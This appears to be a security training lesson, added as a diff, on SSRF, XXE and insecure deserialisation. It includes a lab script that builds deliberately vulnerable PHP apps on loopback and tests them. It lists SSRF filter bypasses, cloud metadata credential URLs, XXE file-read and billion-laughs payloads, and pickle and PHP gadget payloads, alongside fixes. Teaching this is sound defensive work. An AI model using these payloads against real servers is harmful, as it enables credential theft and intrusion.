@@ -1,0 +1,447 @@
+<h1 id="ssrf-xxe-and-deserialisation">SSRF, XXE and Deserialisation</h1>
+<h2 id="summary">Summary</h2>
+<p>These three share a single mechanism: <strong>the server fetches, parses, or resurrects something on<br />
+your behalf, and does not validate it properly before use.</strong> Each is a <em>trust boundary</em><br />
+failure in a different direction — inward (the server reaching out), sideways (an external<br />
+entity defining behaviour), and backwards (data becoming code).</p>
+<h2 id="ssrf">SSRF</h2>
+<h3 id="the-mechanism">The mechanism</h3>
+<pre><code class="language-text">  You supply a URL.
+  The SERVER fetches it.
+  The response comes back to you (or is used server-side).
+
+  Now control the URL and you have:
+    - a request proxy on the server's network position
+    - access to everything the server can reach and you cannot
+</code></pre>
+<pre><code class="language-php">// the bug
+$url = $_GET['url'];
+echo file_get_contents($url);
+</code></pre>
+<h3 id="why-filters-fail">Why filters fail</h3>
+<pre><code class="language-text">  FILTER: &quot;must be http:// and must not contain 127.0.0.1&quot;
+
+  BYPASSES, all still working:
+    http://127.0.0.1                  literal
+    http://127.1                      alternate notation
+    http://0x7f000001                 hex
+    http://2130706433                 decimal
+    http://0177.0.0.1                 octal
+    http://[::1]                      IPv6 loopback
+    http://localhost                   by name
+    http://localtest.me               resolves to 127.0.0.1
+    http://127.0.0.1.nip.io           DNS -&gt; 127.0.0.1
+    http://[::ffff:127.0.0.1]         IPv4-mapped IPv6
+    http://metadata.google.internal    the cloud one you actually want
+    redirect: http://allowed.com/ -&gt; 302 -&gt; http://169.254.169.254/
+</code></pre>
+<p><strong>The correct fix is not a better string filter.</strong> It is: resolve the<br />
+hostname, check <em>all</em> resolved addresses against an allowlist, then<br />
+<strong>pin the connection to the address you validated</strong> so DNS rebinding<br />
+cannot change it between the check and the request. Also disable<br />
+redirect following, or re-validate every hop.</p>
+<h3 id="why-it-is-severe">Why it is severe</h3>
+<pre><code class="language-text">  SSRF to cloud metadata -&gt; IAM credentials for the whole account
+  SSRF to an internal admin -&gt; full control of the internal app
+  SSRF to a network scanner  -&gt; port-scan the internal network from inside
+  SSRF with a gopher:// sink -&gt; speak arbitrary protocols
+
+  THE CLOUD CASE:
+    http://169.254.169.254/latest/meta-data/iam/security-credentials/
+    -&gt; AWS credentials
+    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+    -&gt; GCP token
+    http://169.254.169.254/metadata/instance?api-version=2021-02-01
+    -&gt; Azure metadata, reachable WITHOUT a header (IMDSv1)
+</code></pre>
+<h2 id="xxe">XXE</h2>
+<pre><code class="language-text">  XML lets you define entities. If the parser resolves them, you get
+  arbitrary file read, and sometimes SSRF and DoS.
+
+  &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+  &lt;root&gt;&amp;xxe;&lt;/root&gt;
+
+  WHERE THE PARSER IS:
+    XML parsers in Java, .NET, PHP, Python, C, and most frameworks
+    DO resolve entities by default unless told not to.
+
+  THE FIX, always:
+    &lt;!DOCTYPE ... [ disable external entities ]&gt;
+    - libxml: LIBXML_NOENT off, and DOCTYPE loading disabled
+    - PHP:  libxml_disable_entity_loader(true); now deprecated but seen
+    - Java: disallow-doctype-decl = true
+    - Python: defusedxml, or lxml with resolve_entities=False
+    - .NET: XmlReaderSettings with DtdProcessing.Prohibit
+
+  A more modern fix: do not accept XML at all unless you must, and prefer
+  JSON. XXE is overwhelmingly an XML-acceptance problem.
+</code></pre>
+<h2 id="deserialisation">Deserialisation</h2>
+<pre><code class="language-text">  An object graph is restored from bytes. If the format encodes TYPE
+  INFORMATION - as Java, Python pickle, PHP serialize, .NET BinaryFormatter
+  and Ruby Marshal all do - then &quot;restoring&quot; can construct arbitrary objects.
+
+  THE MECHANISM:
+    the stream contains not just values but CLASS NAMES and FIELD NAMES.
+    the deserialiser looks up each class and populates it, calling any
+    __wakeup / __destruct / readObject that exists.
+
+  THE IMPACT:
+    a gadget chain - an existing, legitimate class whose methods, called
+    in the order the deserialiser chooses, do something dangerous.
+    command execution is the usual result.
+
+  LANGUAGES AT RISK AND THEIR NAMES:
+    Java      ObjectInputStream, readObject, gadget chains in commons-collections
+    Python    pickle.loads, __reduce__
+    PHP       unserialize(), __wakeup, __destruct, POP chain
+    .NET      BinaryFormatter, SoapFormatter (both now disabled by default)
+    Ruby      Marshal.load (not eval, but equivalent)
+    Node      node-serialize, child_process
+</code></pre>
+<pre><code class="language-python"># Python pickle, the simplest possible demonstration
+import pickle, base64
+class RCE:
+    def __reduce__(self): return (eval, (&quot;print('deserialised into code execution')&quot;,))
+print(base64.b64encode(pickle.dumps(RCE())).decode())
+# running pickle.loads on that payload executes the string
+</code></pre>
+<pre><code class="language-php">// PHP, the most commonly exploited in the wild
+class Gadget {
+  public $cmd;
+  public function __destruct() { if ($this-&gt;cmd) system($this-&gt;cmd); }
+}
+unserialize($userInput);   // -&gt; system() on a controlled string
+</code></pre>
+<h3 id="the-fix">The fix</h3>
+<pre><code class="language-text">  1. DO NOT DESERIALISE UNTRUSTED DATA. Ever. This is the whole fix.
+  2. If you must: use a data-only format (JSON), never a type-carrying one.
+  3. Signed serialised data (HMAC) prevents *tampering*, not *execution*
+     - but it does stop an attacker who cannot get the key, which is most
+  4. Allowlist the classes that may be deserialised where the API allows it
+  5. Run deserialisation in a sandboxed process with no network
+</code></pre>
+<p><strong>A signed-but-wrong-format token is still code execution</strong> — this is the<br />
+mechanism behind several JWT and cookie attacks in the wild. Signature<br />
+proves who wrote it; it does not prove it is data.</p>
+<h2 id="terminology">Terminology</h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>SSRF</strong></td>
+<td>Server-side request forgery</td>
+</tr>
+<tr>
+<td><strong>Blind SSRF</strong></td>
+<td>You cannot see the response; infer from timing/behaviour</td>
+</tr>
+<tr>
+<td><strong>OAST / out-of-band</strong></td>
+<td>Your server receives the callback</td>
+</tr>
+<tr>
+<td><strong>Cloud metadata</strong></td>
+<td><code>169.254.169.254</code> credential service</td>
+</tr>
+<tr>
+<td><strong>DNS rebinding</strong></td>
+<td>Name resolves to a validated IP then changes</td>
+</tr>
+<tr>
+<td><strong>XXE</strong></td>
+<td>XML external entity injection</td>
+</tr>
+<tr>
+<td><strong>External entity</strong></td>
+<td>A <code>SYSTEM</code> entity that loads a URI</td>
+</tr>
+<tr>
+<td><strong>Billion laughs</strong></td>
+<td>XXE-based expansion DoS</td>
+</tr>
+<tr>
+<td><strong>Deserialisation</strong></td>
+<td>Restoring an object graph from bytes</td>
+</tr>
+<tr>
+<td><strong>Type confusion in streams</strong></td>
+<td>Serialised formats carry class names</td>
+</tr>
+<tr>
+<td><strong>Gadget chain</strong></td>
+<td>Legitimate classes whose methods become harmful</td>
+</tr>
+<tr>
+<td><strong><code>__reduce__</code> / <code>__wakeup</code></strong></td>
+<td>Python / PHP deserialisation hooks</td>
+</tr>
+<tr>
+<td><strong>Allowlist of classes</strong></td>
+<td>Restrict what may be deserialised</td>
+</tr>
+</tbody>
+</table>
+<h2 id="kali-commands">Kali commands</h2>
+<pre><code class="language-bash">mkdir -p ~/aegis/labs/ps-05 &amp;&amp; cd ~/aegis/labs/ps-05
+
+# --- 1. SSRF with a scope guard, because this class of bug is for
+#        internal addresses and you must not point it anywhere else ---
+cat &gt; scope-guard.sh &lt;&lt;'EOF'
+#!/usr/bin/env bash
+# The SSRF probe refuses anything that is not loopback. SSRF testing
+# against cloud metadata or a third party is not your engagement.
+allow_loopback_only() {
+  local host=&quot;$1&quot;
+  case &quot;$host&quot; in
+    127.*|localhost|::1|0:0:0:0:0:0:0:1) return 0 ;;
+    *) return 1 ;;
+  esac
+}
+for h in &quot;$@&quot;; do
+  if ! allow_loopback_only &quot;$h&quot;; then
+    echo &quot;REFUSED: $h is not loopback. SSRF testing here stays local.&quot; &gt;&amp;2
+    exit 3
+  fi
+done
+EOF
+chmod +x scope-guard.sh
+
+# --- 2. the vulnerable fetcher ---
+cat &gt; fetch.php &lt;&lt;'PHP'
+&lt;?php
+// A deliberately unsafe fetcher, bound to loopback, that will happily
+// read local files and loopback URLs.
+$u = $_GET['url'] ?? '';
+if ($u === '') { echo &quot;&lt;p&gt;usage: ?url=&lt;/p&gt;&quot;; exit; }
+$scheme = strtolower(parse_url($u, PHP_URL_SCHEME) ?: '');
+echo &quot;&lt;p&gt;fetching: &quot; . htmlspecialchars($u) . &quot; (scheme: $scheme)&lt;/p&gt;&quot;;
+if (preg_match('#^file://#i', $u)) {
+    // SSRF -&gt; local file read. In a real app this is often accidental.
+    $p = substr($u, 7);
+    echo &quot;&lt;pre&gt;&quot; . htmlspecialchars(@file_get_contents($p)) . &quot;&lt;/pre&gt;&quot;;
+} elseif (in_array($scheme, ['http','https'], true)) {
+    $ctx = stream_context_create(['http' =&gt; ['timeout' =&gt; 3, 'ignore_errors' =&gt; true]]);
+    $r = @file_get_contents($u, false, $ctx);
+    echo &quot;&lt;pre&gt;&quot; . htmlspecialchars($r === false ? &quot;(failed)&quot; : substr($r,0,500)) . &quot;&lt;/pre&gt;&quot;;
+} else {
+    echo &quot;&lt;p&gt;scheme not allowed&lt;/p&gt;&quot;;
+}
+PHP
+
+# --- 3. the XXE parser ---
+cat &gt; xml.php &lt;&lt;'PHP'
+&lt;?php
+$body = file_get_contents('php://input') ?: ($_GET['xml'] ?? '');
+libxml_use_internal_errors(true);
+$prev = null;
+// THE BUG: entity resolution is on. External entities are loaded.
+$doc = simplexml_load_string($body, 'SimpleXMLElement',
+            LIBXML_NOENT | LIBXML_DTDLOAD);   // &lt;-- both flags are the vulnerability
+header('Content-Type: text/html; charset=utf-8');
+if ($doc === false) { echo &quot;&lt;pre&gt;parse error: &quot; . htmlspecialchars(
+    (libxml_get_last_error()['message'] ?? 'unknown')) . &quot;&lt;/pre&gt;&quot;; }
+else echo &quot;&lt;pre&gt;&quot; . htmlspecialchars($doc-&gt;asXML()) . &quot;&lt;/pre&gt;&quot;;
+PHP
+
+# --- 4. the deserialisation sink ---
+cat &gt; unser.php &lt;&lt;'PHP'
+&lt;?php
+// THE BUG: unserialize on user input. The class below is the &quot;gadget&quot;.
+class AEGIS_Gadget {
+    public $cmd = null;
+    public function __destruct() {
+        if ($this-&gt;cmd) { echo &quot;&lt;pre&gt;[gadget fired: &quot; . htmlspecialchars($this-&gt;cmd) . &quot;]&lt;/pre&gt;&quot;; }
+    }
+}
+$in = $_GET['d'] ?? '';
+if ($in === '') { echo &quot;&lt;p&gt;usage: ?d=&amp;lt;base64&amp;gt;&lt;/p&gt;&quot;; exit; }
+$obj = unserialize(base64_decode($in));          // &lt;-- the vulnerability
+echo &quot;&lt;p&gt;unserialised: &quot; . htmlspecialchars(get_class($obj)) . &quot;&lt;/p&gt;&quot;;
+PHP
+
+nohup php -S 127.0.0.1:8080 -t . &gt; php.log 2&gt;&amp;1 &amp;
+sleep 1
+
+# --- 5. SSRF: the notation bypasses, all against our own loopback ---
+{
+  echo &quot;=== SSRF notation bypasses. Every one targets THIS machine. ===&quot;
+  for u in &quot;http://127.0.0.1:8080/fetch.php?x=1&quot; \
+           &quot;http://127.1:8080/fetch.php?x=1&quot; \
+           &quot;http://0x7f000001:8080/fetch.php?x=1&quot; \
+           &quot;http://2130706433:8080/fetch.php?x=1&quot; \
+           &quot;http://0177.0.0.1:8080/fetch.php?x=1&quot; \
+           &quot;http://[::1]:8080/fetch.php?x=1&quot; \
+           &quot;http://localhost:8080/fetch.php?x=1&quot;; do
+    n=$(curl -s --max-time 6 --get --data-urlencode &quot;url=$u&quot; http://127.0.0.1:8080/fetch.php | grep -c &quot;fetching:&quot;)
+    printf &quot;  %-46s %s\n&quot; &quot;${u:0:46}&quot; &quot;$([ &quot;$n&quot; -ge 1 ] &amp;&amp; echo 'REACHED' || echo 'blocked')&quot;
+  done
+  echo
+  echo &quot;  Seven notations, one address. A blocklist for '127.0.0.1' catches&quot;
+  echo &quot;  exactly one of them. This is why the fix is resolution + pinning.&quot;
+  echo
+  echo &quot;=== the payload that matters: a URL to a file ===&quot;
+  curl -s --get --data-urlencode &quot;url=file:///etc/hostname&quot; http://127.0.0.1:8080/fetch.php \
+    | grep -A2 &quot;pre&quot; | head -3 | sed 's/^/  /'
+  echo
+  echo &quot;  In cloud this is not a file read, it is:&quot;
+  echo &quot;    http://169.254.169.254/latest/meta-data/iam/security-credentials/&quot;
+  echo &quot;  which returns IAM credentials for the entire account.&quot;
+} 2&gt;&amp;1 | tee 01-ssrf.txt
+
+# --- 6. the correct fix, side by side ---
+cat &gt; fetch-safe.php &lt;&lt;'PHP'
+&lt;?php
+// THE FIX. Resolve, validate EVERY address, pin the connection, refuse
+// redirects. A blocklist is not a fix; this is.
+$u = $_GET['url'] ?? '';
+function ssrf_safe_fetch(string $url, array $allowed_hosts, array $allowed_ips) {
+    $p = parse_url($url);
+    if ($p === false || !in_array(strtolower($p['scheme'] ?? ''), ['http','https'], true))
+        return &quot;scheme not allowed&quot;;
+    $host = strtolower($p['host'] ?? '');
+    if (!in_array($host, $allowed_hosts, true)) return &quot;host not allowed&quot;;
+    if (($p['port'] ?? 80) !== 80 &amp;&amp; ($p['port'] ?? 80) !== 443) return &quot;port not allowed&quot;;
+    $ips = gethostbynamel($host);
+    if (!$ips) return &quot;dns failure&quot;;
+    foreach ($ips as $ip)                                  // validate ALL of them
+        if (!in_array($ip, $allowed_ips, true)) return &quot;resolved ip not allowed: $ip&quot;;
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+      CURLOPT_URL =&gt; $url,
+      CURLOPT_FOLLOWLOCATION =&gt; false,          // NO redirect following
+      CURLOPT_RESOLVE =&gt; [&quot;$host:&quot;.($p['port']??80).&quot;:&quot;.$ips[0]],  // PIN the ip
+      CURLOPT_TIMEOUT =&gt; 3,
+      CURLOPT_RETURNTRANSFER =&gt; true,
+    ]);
+    $r = curl_exec($ch);
+    curl_close($ch);
+    return $r === false ? &quot;fetch failed&quot; : substr($r, 0, 500);
+}
+echo &quot;&lt;pre&gt;&quot; . htmlspecialchars(
+  ssrf_safe_fetch($u, ['example.test'], ['93.184.216.34'])) . &quot;&lt;/pre&gt;&quot;;
+PHP
+{
+  echo &quot;=== what the fix does, step by step ===&quot;
+  sed -n '/^function ssrf_safe_fetch/,/^}/p' fetch-safe.php | sed 's/^/  /' | head -22
+  echo
+  echo &quot;  1. scheme allowlist          - not 'does not contain javascript:'&quot;
+  echo &quot;  2. host allowlist            - not 'does not contain 127.'&quot;
+  echo &quot;  3. port allowlist            - blocks the service-scanning use case&quot;
+  echo &quot;  4. resolve, check EVERY ip   - one good ip does not excuse a bad one&quot;
+  echo &quot;  5. CURLOPT_RESOLVE pinning   - DNS cannot change under you (rebinding)&quot;
+  echo &quot;  6. no redirects              - each hop would need re-validation&quot;
+} 2&gt;&amp;1 | tee 02-ssrf-fixed.txt
+
+# --- 7. XXE, live ---
+{
+  echo &quot;=== XXE: external entity reading a local file ===&quot;
+  cat &gt; xxe.xml &lt;&lt;'XML'
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot;&gt; ]&gt;
+&lt;greeting&gt;&amp;xxe;&lt;/greeting&gt;
+XML
+  echo &quot;  payload:&quot;
+  cat xxe.xml | sed 's/^/    /'
+  echo
+  echo &quot;  vulnerable parser (LIBXML_NOENT | LIBXML_DTDLOAD):&quot;
+  curl -s -X POST --data-binary @xxe.xml http://127.0.0.1:8080/xml.php | sed 's/^/    /'
+  echo
+  echo &quot;  same payload, DOCTYPE DISABLED (the fix):&quot;
+  php -r '
+    $x = file_get_contents(&quot;xxe.xml&quot;);
+    libxml_use_internal_errors(true);
+    $d = simplexml_load_string($x, &quot;SimpleXMLElement&quot;);   // no NOENT, no DTDLOAD
+    echo $d === false ? &quot;    parse refused: &quot; .
+         trim(libxml_get_last_error()[&quot;message&quot;]) . &quot;\n&quot;
+       : &quot;    parsed, entities NOT expanded\n&quot;;'
+  echo
+  echo &quot;  The billion laughs variant (DoS, no file read needed):&quot;
+  cat &gt; lol.xml &lt;&lt;'XML'
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE lolz [
+ &lt;!ENTITY lol &quot;lol&quot;&gt;
+ &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
+ &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
+]&gt;
+&lt;lolz&gt;&amp;lol3;&lt;/lolz&gt;
+XML
+  wc -c lol.xml | awk '{print &quot;    payload size:&quot;, $1, &quot;bytes -&gt; expands to ~1 GB&quot;}'
+} 2&gt;&amp;1 | tee 03-xxe.txt
+
+# --- 8. deserialisation, live ---
+{
+  echo &quot;=== PHP: build a malicious serialised object ===&quot;
+  php -r '
+    class AEGIS_Gadget { public $cmd = &quot;id&quot;;
+      public function __destruct(){ if($this-&gt;cmd) echo &quot;[gadget fired: {$this-&gt;cmd}]\n&quot;; } }
+    echo &quot;    payload (base64): &quot; . base64_encode(serialize(new AEGIS_Gadget)) . &quot;\n&quot;;' \
+    | tee payload.txt
+  P=$(grep -oE 'base64\): [A-Za-z0-9+/=]+' payload.txt | awk '{print $2}')
+  echo
+  echo &quot;  sending it to the sink:&quot;
+  curl -s --get --data-urlencode &quot;d=$P&quot; http://127.0.0.1:8080/unser.php | sed 's/^/    /'
+  echo
+  echo &quot;  THE FIX: do not call unserialize() on anything a client sent.&quot;
+  echo &quot;  Compare:&quot;
+  echo &quot;    unserialize(\$in)                      &lt;- code from the wire&quot;
+  echo &quot;    json_decode(\$in, true, 512, JSON_THROW_ON_ERROR)   &lt;- data from the wire&quot;
+  echo
+  echo &quot;  (json_decode does not instantiate classes. There is no gadget&quot;
+  echo &quot;   chain in it, because there are no classes.)&quot;
+} 2&gt;&amp;1 | tee 04-deser.txt
+
+# --- 9. Python pickle, the cleanest demonstration in the language ---
+python3 - &lt;&lt;'PY' | tee 05-pickle.txt
+import pickle, base64, io
+
+class RCE:
+    def __reduce__(self):
+        # __reduce__ returns (callable, args). The unpickler CALLS it.
+        return (print, (&quot;deserialised straight into code execution&quot;,))
+
+payload = base64.b64encode(pickle.dumps(RCE())).decode()
+print(&quot;  the 'data' being serialised:&quot;)
+print(&quot;   &quot;, payload[:60], &quot;...&quot;, f&quot;({len(payload)} chars)&quot;)
+print()
+print(&quot;  it looks like opaque data. It is a program.&quot;)
+print()
+print(&quot;  unpickling it:&quot;)
+pickle.loads(base64.b64decode(payload))
+print()
+print(&quot;  THE FIX, and it is not 'validate the pickle':&quot;)
+print(&quot;    import json instead of pickle&quot;)
+print(&quot;    or:  RestrictedUnpickler.find_class -&gt; allowlist, else raise&quot;)
+print()
+print(&quot;  Why allowlisting is still not enough if an allowed class has a&quot;)
+print(&quot;  dangerous __reduce__ - which is why json is the real answer.&quot;)
+PY
+cat 05-pickle.txt
+rm -f xxe.xml lol.xml payload.txt
+</code></pre>
+<p><strong>Step 5 is the deliverable</strong>: seven notations of <code>127.0.0.1</code>, and a naive blocklist catching<br />
+exactly one. That table is the entire argument for resolve-then-pin over string filtering, and<br />
+<code>fetch-safe.php</code> is the fix written out with the reason for each line.</p>
+<p><strong>Step 9</strong> is the cleanest deserialisation demonstration available — <code>__reduce__</code> returns a<br />
+callable, and the unpickler <em>calls</em> it. Twelve lines, and the concept is complete.</p>
+<p><strong>Record:</strong> <code>01-ssrf.txt</code> and <code>05-pickle.txt</code>.</p>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>Give four SSRF filter bypasses that do not contain <code>127.0.0.1</code>.</li>
+<li>Why is resolve-then-pin better than a hostname allowlist alone?</li>
+<li>What URL do you request for AWS, GCP and Azure metadata respectively?</li>
+<li>What do <code>LIBXML_NOENT</code> and <code>LIBXML_DTDLOAD</code> do, and which enables XXE?</li>
+<li>Why does a billion laughs attack need no file read?</li>
+<li>What is a gadget chain, and why do PHP and Java have them?</li>
+<li>Why does signing a serialised token not prevent deserialisation attacks?</li>
+<li>Give the one fix for deserialisation, and why is an allowlist weaker?</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>SSRF</strong> → <strong>XXE</strong> → <strong>Deserialization</strong> → <strong>Cloud Metadata</strong> → <strong>OWASP Top 10</strong> →<br />
+<strong>Input Validation</strong>.<br />
+<code>ps-06</code> covers the file-system sibling of all three.</p>
